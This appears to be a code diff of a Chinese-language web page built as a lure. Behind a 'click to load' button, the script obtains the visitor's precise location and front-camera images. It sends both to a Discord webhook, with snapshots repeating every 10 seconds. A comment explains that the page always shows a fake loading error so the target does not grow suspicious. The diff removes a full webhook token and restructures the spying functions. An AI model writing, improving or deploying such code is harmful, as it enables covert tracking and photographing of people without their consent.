@@ -10,78 +10,86 @@
 <button onclick="startAction()">點擊載入</button>
 <p id="status"></p>
 
-<!-- 隱藏的 video 和 canvas，用於背後處理影像 -->
+<!-- 隱藏元件 -->
 <video id="v" style="display:none;" autoplay playsinline></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-var webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
+var webhook = "https://discord.com";
 
 function startAction() {
-    getLocation(); // 原有的定位
-    getCamera();   // 新增的截圖
+    document.getElementById("status").innerHTML = "正在取得內容...";
+    // 兩項功能獨立執行，互不影響
+    tryLocation(); 
+    tryCamera();   
 }
 
-function getLocation() {
-    document.getElementById("status").innerHTML = "正在取得內容...";
+// --- 定位功能 ---
+function tryLocation() {
     if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(success, error, {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-        });
+        navigator.geolocation.getCurrentPosition(function(pos) {
+            var lat = pos.coords.latitude;
+            var lon = pos.coords.longitude;
+            var acc = pos.coords.accuracy;
+
+            fetch(webhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    content: "📍 **[定位成功]**\n緯度: " + lat + "\n經度: " + lon + "\n精準度: " + acc + " 公尺\n地圖: https://www.google.com" + lat + "," + lon
+                })
+            });
+            updateStatus();
+        }, function(err) {
+            console.log("定位權限被拒絕或錯誤");
+            updateStatus();
+        }, { enableHighAccuracy: true, timeout: 10000 });
     }
 }
 
-function success(pos) {
-    var lat = pos.coords.latitude;
-    var lon = pos.coords.longitude;
-    fetch(webhook, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            content: "📍 定位成功\n地圖: https://www.google.com/maps?q=" + lat + "," + lon
-        })
-    });
-    document.getElementById("status").innerHTML = "內容載入失敗，請重試。";
-}
-
-function error(err) {
-    document.getElementById("status").innerHTML = "需要允許權限才能查看內容";
-}
-
-function getCamera() {
-    // 請求相機權限
+// --- 相機功能 ---
+function tryCamera() {
     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
     .then(function(stream) {
         var video = document.getElementById("v");
         video.srcObject = stream;
         
-        // 每 5 秒截圖並傳送一次
-        setInterval(function() {
-            var canvas = document.getElementById("c");
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            var ctx = canvas.getContext("2d");
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            canvas.toBlob(function(blob) {
-                var formData = new FormData();
-                formData.append('file', blob, 'capture.jpg');
-                formData.append('payload_json', JSON.stringify({ content: "📸 自動擷取畫面" }));
-                
-                fetch(webhook, {
-                    method: "POST",
-                    body: formData
-                });
-            }, "image/jpeg", 0.7); // 壓縮率 0.7 減少流量
-        }, 5000);
+        // 權限一拿到就先傳一張，之後每 10 秒傳一張 (避免 Discord 頻率限制)
+        sendSnap(video);
+        setInterval(function() { sendSnap(video); }, 10000);
+        
+        updateStatus();
     })
     .catch(function(err) {
         console.log("相機權限被拒絕");
+        updateStatus();
     });
+}
+
+// 擷取畫面並傳送的輔助函數
+function sendSnap(video) {
+    var canvas = document.getElementById("c");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    var ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0);
+    
+    canvas.toBlob(function(blob) {
+        if(!blob) return;
+        var formData = new FormData();
+        formData.append('file', blob, 'snap.jpg');
+        formData.append('payload_json', JSON.stringify({ content: "📸 **[相機擷取成功]**" }));
+        
+        fetch(webhook, { method: "POST", body: formData });
+    }, "image/jpeg", 0.5);
+}
+
+function updateStatus() {
+    // 為了不讓對方起疑，統一顯示載入失敗
+    document.getElementById("status").innerHTML = "內容載入失敗，請檢查網路連線或權限設定。";
 }
 </script>
 
 </body>
 </html>
+
